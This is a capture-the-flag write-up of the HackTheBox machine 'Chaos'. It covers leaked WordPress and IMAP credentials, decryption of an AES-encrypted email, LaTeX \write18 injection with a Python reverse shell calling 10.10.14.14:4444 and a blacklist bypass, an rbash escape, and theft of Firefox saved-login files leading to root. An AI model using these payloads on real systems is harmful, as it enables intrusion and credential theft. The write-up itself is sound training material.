Chaos is a medium-difficulty Linux machine that has a lot going on. The route to `user.txt` is indeed a long one, as the path winds from finding some insecurely stored email account credentials to reversing a Python encryption program to abusing a web application that creates PDF documents. There are many twists and turns along the way. The good news is that once user-level access to the system has been gained, the majority of the work is done. A saved browser credential paired with a weak (and heavily overused!) master password will lead to accessing the system as `root`. The moral of this story may be that your stored credentials are only as strong as the password you're using to protect them. And for the love of Linux, don't reuse passwords.

*Note: I completed this challenge on January 12th, 2019, however I'm just now writing it up in December 2019. As such, some of the details are sparse.*

## User
To begin the enumeration process, a port scan was run against the target using `masscan`. The purpose of "this initial scan is to quickly determine which ports are open so that a more focused `nmap` scan can be performed that will target only the open ports discovered by `masscan`.

```
root@kali:~/workspace/hackthebox/Chaos# masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.120

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-25 18:03:59 GMT

...
```

From `masscan`, it was revealed that a variety of TCP ports were listening for connections. Using this information, a second scan was run using `nmap` to more thoroughly examine the services listening on the discovered ports.

```

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.24 seconds
```

This is quite a bit of information to work with. Each service should be enumerated thoroughly before focusing in on one particular service. This is to say that an initial enumeration "sweep" should be conducted before a more thorough examiniation of any service is performed.

To begin, browsing to the `http://10.10.10.120` URL (the Apache service listening on port 80) suggests that access to the site is not permitted via the server's IP address (`10.10.10.120`). Instead, the site must be accessed via its domain name. 

![no_directip.png](/assets/images/htb/chaos/no_directip.png)

There is likely some Apache configuration in place similar to the following:

```
<VirtualHost *:80>
    ServerName 10.10.10.120
    Redirect 403 /
    ErrorDocument 403 "Direct IP not allowed"
    DocumentRoot /dev/null/
    UseCanonicalName Off
    UserDir disabled
</VirtualHost>
```

Similarly, browsing to HTTP service listening on port 10000 displays the error shown below.

![domain_hint.png](/assets/images/htb/chaos/domain_hint.png)

This error suggests that:

1. HTTPS needs to be used to access the content on port 10000
2. The domain name is `chaos.htb`


The following command was issued on the testing system to map the `10.10.10.120` IP address to the domain name `chaos.htb`.

```
root@kali:~/workspace/hackthebox/Chaos# echo "10.10.10.120 chaos.htb" >> /etc/hosts
```

Now, browsing to `http://chaos.htb` loads a basic website. 

![chaos_htb.png](/assets/images/htb/chaos/chaos_htb.png)

A `gobuster` scan was run against `http://chaos.htb` and against `http://10.10.10.120` to enumerate directories available via the website. The example for `http://10.10.10.120` is shown below.

```
root@kali:~/workspace/hackthebox/Chaos# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.120
```

The above scan quickly discovers the `/wp` directory. This suggests the website was built with the Wordpress CMS.

Browsing to `http://10.10.10.120` shows a directory with a `wordpress/` subdirectory. Continuing on to the `wordpress/` directory leads to a page with protected content. A password is required to access the protected content.

![prot_content.png](/assets/images/htb/chaos/prot_content.png)

Clicking the "Protected: chaos" link under the "RECENT POSTS" header seen in the image above directs to a slight different password-protected page. On this page, there is some specific information about the post that includes the publishing date and the author.

![human.png](/assets/images/htb/chaos/human.png)

A little bit of guess work might lead to entering the word `human` as the password to unlock the protected content. Using `human` as a password reveals the contents of the protected post:

```
Creds for webmail :
username – ayush
password – jiujitsu
```

Looking back to the `nmap` scan, it can be seen that the open source IMAP and POP3 email server Dovecot is in use on the system (specifically on ports 143, 993, and 995). The `openssl` Linux tool was used to interact with the SSL-encrypted Dovecot service listening on TCP 993. In this case, authentication was not allowed using `telnet 10.10.10.120 143` over the unencrypted Dovecot IMAP service on port 143.

```
root@kali:~/workspace/hackthebox/Chaos# openssl s_client -crlf -connect 10.10.10.120:993
```

Once connected, the credentials found previously can be used to authenticate to the service.

*Note: When interacting with the IMAP service, a string of characters must be included before each user-issued IMAP command. The string of characters serves to identify transactions within the protocol. In the following examples, the "HTB" string will be used as the IMAP transaction ID.*

```
HTB LOGIN ayush jiujitsu
HTB OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
```

Next, the IMAP `LIST` command is used to show all available mailboxes. The syntax for the `LIST` command is `LIST "<mailbox path>" "<search argument>"`.

```
HTB LIST "" "*"
* LIST (\NoInferiors \UnMarked \Drafts) "/" Drafts
* LIST (\NoInferiors \UnMarked \Sent) "/" Sent
* LIST (\HasNoChildren) "/" INBOX
HTB OK List completed (0.001 + 0.000 secs).
```

Now, the `SELECT` command is used to specify which mailbox to interact with. After searching each mailbox, only the `Drafts` mailbox contains an item.

```
HTB SELECT Drafts
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1540728611] UIDs valid
* OK [UIDNEXT 5] Predicted next UID
HTB OK [READ-WRITE] Select completed (0.002 + 0.000 + 0.001 secs).
```

The `FETCH` command can be used to view the email headers. The number following the `FETCH` command specifies the message of interest.

```
HTB FETCH 1 (BODY[HEADER])
* 1 FETCH (BODY[HEADER] {349}
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="=_00b34a28b9033c43ed09c0950f4176e1"

Subject: service

X-Sender: ayush@localhost
User-Agent: Roundcube Webmail/1.3.8

)
HTB OK Fetch completed (0.002 + 0.000 + 0.001 secs).
```

*Note: The "webmail.chaos.htb" subdomain is present in the "Message-ID" line within the header above. The Roundcube Webmail page can be accessed through "http://webmail.chaos.htb" after adding "10.10.10.120 webmail.chaos.htb" to the "/etc/hosts" file.*

To see what sort of information is present within the body of the email, another `FETCH` command was used.

```
HTB FETCH 1 (BODY)
* 1 FETCH (BODY (("text" "plain" ("charset" "US-ASCII" "format" "flowed") NIL NIL "7bit" 126 6)("application" "octet-stream" ("name" "enim_msg.txt") NIL NIL "base64" 372)("text" "x-python" ("charset" "us-ascii" "name" "en.py") NIL NIL "base64" 1100 14) "mixed"))
HTB OK Fetch completed (0.001 + 0.000 secs).
```

This output suggests that there are three parts included in the "body" of the email; a "US-ASCII" message that is 126 bytes, an "octet-stream" message that is base64 encoded and 372 bytes, and a "us-ascii" message that is base64 encoded and 1100 bytes. Using `FETCH` to read the first part reveals the following message:

```
HTB FETCH 1 (BODY[1])
* 1 FETCH (BODY[1] {126}
Hii, sahay
Check the enmsg.txt
You are the password XD.
Also attached the script which i used to encrypt.
Thanks,
Ayush
)
HTB OK Fetch completed (0.001 + 0.000 secs).
```

This suggests that the other two "body" segements of the email are the attachments `enmsg.txt` (shown as `enim_msg.txt` in the header) and a Python script (shown as `en.py` in the header). Also, the author of the message `Ayush` mentions to the recipient `sahay` that they (`sahay`) are the password or key for the encrtyped message.

The following `FETCH` command retrieves the first attachment, `enim_msg.txt`:

```
HTB FETCH 1 (BODY[2])
* 1 FETCH (BODY[2] {372}

The second attachment, `en.py` can be retrieved with a final `FETCH` command.

```

*Note: The entire email message could be read in one command using "HTB FETCH 1 BODY[]"*

After transferring the base64 encoded text to two separate files on the attacking system and removing the newline characters as well as the `)` character that terminates each base64 encoded string, the contents can be decoded using the `base64 -d` command.

```
root@kali:~/workspace/hackthebox/Chaos# base64 -d enim_msg.b64 > enim_msg.txt; base64 -d en.b64 > en.py
```

The data within `enim_msg.txt` is encrypted, and therefore is unintelligble in its current state. The email message from `Ayush` mentions that `enim_msg.txt` was encrypted by the `en.py` program which is shown below.

```python
def encrypt(key, filename):
    chunksize = 64*1024
    outputFile = "en" + filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV =Random.new().read(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))

def getKey(password):
            hasher = SHA256.new(password.encode('utf-8'))
            return hasher.digest()
```

At this point, there are a few important pieces of information that will be key in reversing the encryption process:

1. The `filesize` variable
2. The `IV` variable
3. The `encryptor` variable
4. The `with open(outputFile, 'wb') as outfile:` line and the two lines following it
5. The encryption/decryption key is known to be `sahay`


The `filesize` variable is simply the size in bytes of the to-be-encrypted file prepended with zeroes so that the variable is 16 bytes long. For example, a file that is 39 bytes in size will result in the `filesize` variable being `0000000000000039`

The `IV` variable is used as the [initialization vector](https://en.wikipedia.org/wiki/Initialization_vector) for data encryption. Its value will be the first 16 bytes of a file object, as created by `Random.new()` from the `Crypto.Random` Python package.

The `encryptor` variable shows that [AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) encryption was used in CBC mode. The same should be used during decryption.

The `with open(outputFile, 'wb') as outfile:` and the two lines following show that the `filesize` variable (16 bytes) and the `IV` variable (also 16 bytes) are written to the output file (i.e. `enim_msg.txt`) before any encrypted data is written. As the `IV` was used in the `encryptor` variable, the same `IV` will need to be used during decryption. 

This means that the first 32 bytes of any file encrypted by this program are not encrypted. This is to say that the 33rd byte of any file encrypted by this program is always the first byte that needs to be decrypted. The first 16 bytes are the filesize padded with zeroes, and the next 16 bytes are the `IV`.

The fact that the encryption/decryption key is known to be `sahay` is relevant because AES is a symmetric-key algorithm which means that the same key is used for encrypting and decrypting data.

Using this information, the following decryption program was written.

```python
#!/usr/bin/python3
from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Hash import SHA256

# reused from encryption program
def getKey(password):
    hasher = SHA256.new(password.encode('utf-8'))
    return hasher.digest()

# opens enim_msg.txt in binary mode
with open('enim_msg.txt', mode='rb') as f:
    msg = f.read()

filesize = msg[:16] # don't care about this
IV = msg[16:32]
decrypt_me = msg[32:]
key = getKey('sahay')
decryptor = AES.new(key, AES.MODE_CBC, IV)
result = decryptor.decrypt(decrypt_me).strip()

print(result.decode())
```

Running the above program (with `enim_msg.txt` in the same directory as the program) results in the following:

```
root@kali:~/workspace/hackthebox/Chaos# python3 decrypt.py 
SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK
```

This appears to be base64 encoded. Saving the above output and using `base64` to decode the data reveals the message shown below:

```
Hii Sahay

Please check our new service which create pdf

p.s - As you told me to encrypt important msg, i did :)

http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3

Thanks,
Ayush
```

Browsing to the hidden directory from the message above uncovers a custom PDF creation application created by Chaos Inc. As suggested by the message on the page, there are three templates currently available, but only one of them is working.

![pdf_creator.png](/assets/images/htb/chaos/pdf_creator.png)

Using `burpsuite` to proxy the web requests made from this page, it was discovered that the system is using [LaTex](https://en.wikipedia.org/wiki/LaTeX) to write PDF files. This was discovered in the response returned by the server to a POST request, as shown below.

![latex_response.png](/assets/images/htb/chaos/latex_response.png)

After a bit of resarch, some very useful information was found regarding [Hacking with LaTex](https://0day.work/hacking-with-latex/). After a bit of experimenting with this discovered information, it was determined that the following text (almost entirely reused from "Hacking with LaTex") can be passed to the target system via the input field on the PDF creator web page to obtain a reverse shell on the system. This is possible since `\write18` is enabled (as visible in the response above.) 

```
\def \imm {\string\imme}
\def \diate {diate}
\def \eighteen {\string18}
\def \wwrite {\string\write\eighteen}
\def \args {\string{python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'\string}}
% First run
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{\imm\diate\wwrite\args}
\closeout\outfile
% Second run
\newread\file
\openin\file=cmd.tex
\read\file to\fileline 
\fileline
\closein\file
Run1
```

The `\def` commands are a way around blacklisted words. Ultimately, the `\def` commands are used to create variables that when combined form blacklisted words/commands.

For this to work, the PDF creation process needs to run twice. The first time, the `cmd.tex` file will be written to the system which contains the Python reverse shell exploit code. The second time the process is run, `cmd.tex` is read and the commands within are executed.

*Note that this method is rather finicky (and unnecessary). Looking at other writeups for this machine suggests that the blacklist-bypassing "\def" commands are not needed and that a more straight forward shell can be obtained using the command shown below.*

```
\immediate\write18{python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'}
```

Ater a shell connection is established and [upgraded](https://mnorris.io/hackthebox/Curling/#shell_upgrade), `su` can be used to switch users from `www-data` to `ayash` who has reused the previously-discovered `jiujitsu` password.

```
www-data@chaos:/$ su --login ayush
```

The `ayush` user's default shell is `rbash`, which is a restricted shell. This means that very few commands can be run from within the shell. The text below shows an example of the `cd` command failing and that the user's shell is `rbash`.

```
ayush@chaos:/$ cd /home
rbash: cd: restricted
ayush@chaos:/$ echo $SHELL
/opt/rbash
```

An additional error message is received when attempting to run commands with `/` in them (or any command that isn't in set within the `ayush` user's PATH variable):

```
ayush@chaos:/$ ls
rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
ayush@chaos:/$ echo $PATH
/home/ayush/.app
```

As the `echo` command is allowed, the following command was issued to discover which programs `ayush` is able to run.

```
ayush@chaos:/$ echo /home/ayush/.app/* 
/home/ayush/.app/dir /home/ayush/.app/ping /home/ayush/.app/tar
```

This shows that the `ayush` user is only allowed to run `dir`, `ping`, and `tar`.

Note that previously the command `su --login ayush` was issued when switching from the `www-data` user to the `ayush` user. Using the `su` command along with `-`, `l`, or `--login` (they all do the same thing) will (from `man su`) "start the shell as a login shell with an environment similar to a real login." Logging in as the `ayush` user in this way allows for a simple escape from the `rbash` shell. A new PATH variable was exported, escaping the `ayush` user from the restricted shell.

 ```
ayush@chaos:~$ export PATH=/bin:/usr/bin/:$PATH
ayush@chaos:~$ echo $PATH
/bin:/usr/bin/:/home/ayush/.app
ayush@chaos:~$ /bin/bash
```

From here, the `user.txt` flag can be read.

```
ayush@chaos:~$ cat user.txt

```

## Root
The route to privilege escalation lies within the hidden `.mozilla` directory. in `/home/ayush`. In the `~/.mozilla/firefox/bzo7sjt1.default` directory there is a `logins.json` file, the contents of which is shown below.

```
{"nextId":3,"logins":[{"id":2,"hostname":"https://chaos.htb:10000","httpRealm":null,"formSubmitURL":"https://chaos.htb:10000","usernameField":"user","passwordField":"pass","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDSAazrlUMZFBAhbsMDAlL9iaw==","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNx7bW1TuuCuBBAP8YwnxCZH0+pLo6cJJxnb","guid":"{cb6cd202-0ff8-4de5-85df-e0b8a0f18778}","encType":1,"timeCreated":1540642202692,"timeLastUsed":1540642202692,"timePasswordChanged":1540642202692,"timesUsed":1}],"disabledHosts":[],"version":2}
```

Note that the contents include references to the Webmin administrator portal located at `https://chaos.htb:10000`. The `logins.json` file also contains an `encryptedUsername` and an `encryptedPassword`. This appears to be a stored username and password for the Webmin login page. 

From a Mozilla support [page](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile#w_passwords), it is mentioned that saved passwords are stored in two different files. The `key4.db` file stores the key database (an encryption key and master password) for the stored passwords and the `logins.json` file contains the stored, encrypted passwords.

Upon locating the `key4.db` file (it's in the same directory as the `logins.json` file), the two files were transferred to the attacking system using Python's SimpleHTTPServer. To accomplish this, run `python -m SimpleHTTPServer 1234` on the target system. Then, open a browser and browse to `http://chaos.htb:1234`. From here, the files in the directory can be right clicked and downloaded using the "Save Link As..." option.

With the two files in place, the following command was run on the attacking system:

```
root@kali:~/workspace/hackthebox/Chaos# firefox -no-remote -ProfileManager
```

This launches the Firefox Profile Manager tool that will be used to create a new profile that will use the `key4.db` file and the `logins.json` file from the target system.

From this window, the "Create Profile" option was selected. Click through the prompts and name the new profile "Chaos" (or whatever else). The default folder created by the profile creation wizard will work fine, but make note of what it is (`/root/.mozilla/firefox/jhpwqwtd.Chaos/` in this exmaple). Click finish.

Next, copy the `logins.json` file and the `key4.db` file to the directory created via the profile creation wizard.

```
root@kali:~/workspace/hackthebox/Chaos# cp logins.json key4.db /root/.mozilla/firefox/jhpwqwtd.Chaos/
```

At this point, choosing the newly created profile from the Firefox Profile Manager window and clicking "Start Firefox" will launch a new Firefox browser window using the selected profile.

Browsing to the `https://chaos.htb:10000` URL results in the following:

... If you had to guess the master password, would you guess `jiujitsu`?

Once logged in, there are a variety of ways to access the system as the `root` user. The simplest way involves navigating to the "System" tab on the left side bar, clicking on it, and then selecting the "Change Passwords" option. From here, the password for any user can be changed.

![change_pass.png](/assets/images/htb/chaos/change_pass.png)

Back on the target system, the `su` command can be used once again to switch to the `root` user.

```
ayush@chaos:~$ su - root
Password: 
root@chaos:~# 
```

The `root.txt` flag can now be read.

```
root@chaos:~# cat root.txt
